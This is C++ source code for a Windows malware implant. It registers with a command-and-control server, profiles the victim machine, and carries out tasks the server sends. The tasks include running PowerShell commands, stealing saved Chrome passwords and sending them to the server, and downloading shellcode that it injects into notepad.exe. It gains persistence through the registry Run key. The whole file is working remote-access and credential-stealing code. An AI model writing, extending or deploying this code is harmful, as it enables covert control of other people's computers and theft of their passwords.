#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>
#include <string>
#include <iostream>
#include <stdlib.h>
#include "http.h"
#include "exec_shell.h"
#include "aes_gcm.h"
#include "inject.h"
#include "../stealer/chrome.cpp"
#include "nlohmann/json.hpp"

using json = nlohmann::json;

// implant configurations

// uncomment the following for production
// LPCWSTR c2Domain = L"c2-server-app.herokuapp.com";
// int port = 443;
// BOOL useTLS = TRUE;

// uncomment the following for development
LPCWSTR c2Domain = L"127.0.0.1";
int port = 5000;
BOOL useTLS = FALSE;

LPCWSTR registerURI = L"/agent/register";
LPCWSTR getTaskURI = L"/agent/get_task";
LPCWSTR sendResultURI = L"agent/send_results";
std::string password = "magic_conch";
std::string agentId;
DWORD sleepTime = 10 * 1000;

// find the name of victim computer
std::string getComputerName() {

    std::string res;
    char *buf = (char *) malloc(BUF_SIZE);
    DWORD bufSize = BUF_SIZE;
    GetComputerNameA(buf, &bufSize);
    
    res.append(buf);
    
    return res;
}

// find the username of victim computer
std::string getUserName() {

    std::string res;
    char *buf = (char *) malloc(BUF_SIZE);

    std::string name = "USERNAME";
    GetEnvironmentVariableA(&name[0], buf, DWORD(BUF_SIZE));
    
    res.append(buf);
    
    return res;
}

//find the windows version running on victim machine
std::string getWindowsVer() {

    DWORD dwVersion = 0; 
    DWORD dwMajorVersion = 0;
    DWORD dwMinorVersion = 0; 
    DWORD dwBuild = 0;

    dwVersion = GetVersion();
 
    // Get the Windows version.

    dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
    dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));

    // Get the build number.

    if (dwVersion < 0x80000000)              
        dwBuild = (DWORD)(HIWORD(dwVersion));

    std::string res;
    char *buf = (char *) malloc(BUF_SIZE);

    sprintf(buf, "%d.%d (%d)", dwMajorVersion, dwMinorVersion, dwBuild);

    res.append(buf);

    return res;

}

//find the victim's profile id
std::string getProfileID() {
    std::string res;
    char *buf = (char *) malloc(BUF_SIZE);
    
    std::string name = "WT_PROFILE_ID";
    GetEnvironmentVariableA(&name[0], buf, DWORD(BUF_SIZE));
    
    res.append(buf);
    return res;
}

// find number of processors in the victim machine
std::string getCPUNum() {
    std::string res;
    char *buf = (char *) malloc(BUF_SIZE);
    
    std::string name = "NUMBER_OF_PROCESSORS";
    GetEnvironmentVariableA(&name[0], buf, DWORD(BUF_SIZE));
    
    res.append(buf);
    return res;
}

std::string getNetworkInterfaceNum() {
    char *buf = (char *) malloc(BUF_SIZE);

    PIP_INTERFACE_INFO pInfo;
    pInfo = (IP_INTERFACE_INFO *) malloc( sizeof(IP_INTERFACE_INFO) );
    ULONG ulOutBufLen = 0;
    DWORD dwRetVal = 0;

    // get the necessary size in the ulOutBufLen variable
    if ( GetInterfaceInfo(pInfo, &ulOutBufLen) == ERROR_INSUFFICIENT_BUFFER) {
        free(pInfo);
        pInfo = (IP_INTERFACE_INFO *) malloc (ulOutBufLen);
    }

    // GetInterfaceInfo to get the actual data we need
    if ((dwRetVal = GetInterfaceInfo(pInfo, &ulOutBufLen)) == NO_ERROR ) {

        itoa(pInfo->NumAdapters, buf, 10);
        // free memory allocated
        free(pInfo);
        pInfo = NULL;
    } else if (dwRetVal == ERROR_NO_DATA) {
        itoa(0, buf, 10);
    } else {
        //failed to run GetInterfaceInfo
        return buf;
    }
    
    std::string res;
    res.append(buf);
    return res;
}

// register the agent on the c2 server
BOOL registerAgent() {
    
    json jsonPayload = {
        {"agent_id", getProfileID()},
        {"whoami", getComputerName()},
        {"username", getUserName()},
        {"password", password},
        {"cpus", getCPUNum()},
        {"osVersion", getWindowsVer()},
        {"adaptors", getNetworkInterfaceNum()}
    };

    std::string jsonString = jsonPayload.dump();
    std::string response = httpPost(c2Domain, port, registerURI, jsonString, useTLS);
    if (response == "Error") {
        return FALSE;
    }

    json jsonResponse;
    try {
        jsonResponse = json::parse(response);
    } catch (std::exception e) {
        std::cout << e.what() << std::endl;
        return FALSE;
    }

    std::cout << response << std::endl;

    if (jsonResponse["status"] == "ok") {
        return TRUE;
    } else {
        return FALSE;
    }
}

// execute the list of commands and send the result back to the server
void executeTasks(std::vector<json> tasks) {
    for (int i = 0; i < tasks.size(); i++) {
        // json task = json::parse(tasks[i]);
        json task = tasks[i];
        printf("[+] new task %s %s\n", task["command_type"], task["cmd"]);
        if (task["command_type"] == "powershell_cmd") {
            std::string cmd = task["cmd"];
            std::string result = exec_shell(&*( cmd.begin() ));
            std::cout << result << std::endl;

            json jsonResult = {
                {"job_id", task["job_id"]},
                {"agent_id", agentId},
                {"password", password},
                {"results", result}
            };

            std::string jsonString = jsonResult.dump();

            std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);

            if (response == "Error") {
                return;
            }

            json jsonResponse;
            try {
                jsonResponse = json::parse(response);
            } catch (std::exception e) {
                std::cout << e.what() << std::endl;
                return;
            }

            std::cout << response << std::endl << std::endl;
        } else if (task["command_type"] == "steal") {
            std::string result = stealer();

            printf("user passwords: \n %s", result);

            json jsonResult = {
                {"job_id", task["job_id"]},
                {"agent_id", agentId},
                {"password", password},
                {"results", result}
            };

            std::string jsonString = jsonResult.dump();

            std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);

            if (response == "Error") {
                return;
            }

            json jsonResponse;
            try {
                jsonResponse = json::parse(response);
            } catch (std::exception e) {
                std::cout << e.what() << std::endl;
                return;
            }

            std::cout << response << std::endl << std::endl;

        } else if (task["command_type"] == "shellcode") {
            std::string exePath = "C:\\WINDOWS\\System32\\notepad.exe";
            std::string response = httpGet(c2Domain, port, L"/agent/get_shellcode", useTLS);
            std::cout << response.size() << std::endl;
            char* shellcode = &*response.begin();
            std::cout << inject(exePath, shellcode, response.size()) << std::endl;

            json jsonResult = {
                {"job_id", task["job_id"]},
                {"agent_id", agentId},
                {"password", password},
                {"results", ""}
            };

            std::string jsonString = jsonResult.dump();

            response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);

            if (response == "Error") {
                return;
            }

            json jsonResponse;
            try {
                jsonResponse = json::parse(response);
            } catch (std::exception e) {
                std::cout << e.what() << std::endl;
                return;
            }

            std::cout << response << std::endl << std::endl;
        } else if (task["command_type"] == "change_config") {
            // add implementation here
            std::string strST = task["cmd"];
            int s = std::stoi(strST);
            sleepTime = s * 1000;
            std::cout << "sleep time set to " << strST << std::endl;

            json jsonResult = {
                {"job_id", task["job_id"]},
                {"agent_id", agentId},
                {"password", password},
                {"results", ""}
            };

            std::string jsonString = jsonResult.dump();

            std::string response = httpPost(c2Domain, port, sendResultURI, jsonString, useTLS);

            if (response == "Error") {
                return;
            }

            json jsonResponse;
            try {
                jsonResponse = json::parse(response);
            } catch (std::exception e) {
                std::cout << e.what() << std::endl;
                return;
            }

            std::cout << response << std::endl << std::endl;
        }
        
    }
}

// get commands from server and execute them
void getTasksAndExecute() {
    json jsonPayload = {
        {"agent_id", agentId},
        {"password", password}
    };
    std::string jsonString = jsonPayload.dump();

    std::string response = httpPost(c2Domain, port, getTaskURI, jsonString, useTLS);

    if (response == "Error") {
        return;
    }

    json jsonResponse;
    try {
        jsonResponse = json::parse(response);
    } catch (std::exception e) {
        std::cout << e.what() << std::endl;
        return;
    }
    
    if (jsonResponse["status"] == "ok") {
        std::cout << jsonResponse["tasks"] << std::endl;
        std::vector<json> tasks = jsonResponse["tasks"];
        executeTasks(tasks);
    } else {
        std::cout << "no tasks at this time" << std::endl;
    }
}

// using run key to make implant run on start up
void persist() {  
    char exepath[MAX_PATH];
    GetModuleFileNameA(0, exepath, MAX_PATH);

    printf("executable path: %s\n", exepath);

    HKEY hKey;
    LSTATUS status = RegOpenKeyA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        &hKey
    );

    if (status != ERROR_SUCCESS) {
        printf("Error %d: unable to open key\n", status);
    }

    status = RegSetValueExA(
        hKey,
        "implant.exe",
        0,
        REG_SZ,
        (BYTE*)exepath,
        strlen(exepath)
    );

    if (status != ERROR_SUCCESS) {
        printf("Error %d: unable to set key\n", status);
    }

    RegCloseKey(hKey);
}

int main(int argc, char* argv[]){

    // use a mutex to prevent multiple instances of the implant
    LPCSTR szUniqueNamedMutex = "magic_conch";
    HANDLE hHandle = CreateMutexA( NULL, TRUE, szUniqueNamedMutex );
    if( ERROR_ALREADY_EXISTS == GetLastError() )
    {
        // Program already running somewhere
        return 0; // Exit program
    }

    // FreeConsole();

    persist();

    agentId = getProfileID();

    BOOL registered = FALSE;
    do {
        std::cout << "tring to register on c2 server" << std::endl;
        registered = registerAgent();
        Sleep(sleepTime);
    } while (!registered);

    while(1) {
        std::cout << "wake up" << std::endl;
        getTasksAndExecute();
        Sleep(sleepTime);
    }

    // Upon app closing:
    ReleaseMutex( hHandle ); // Explicitly release mutex
    CloseHandle( hHandle ); // close handle before terminating

    return 0;
}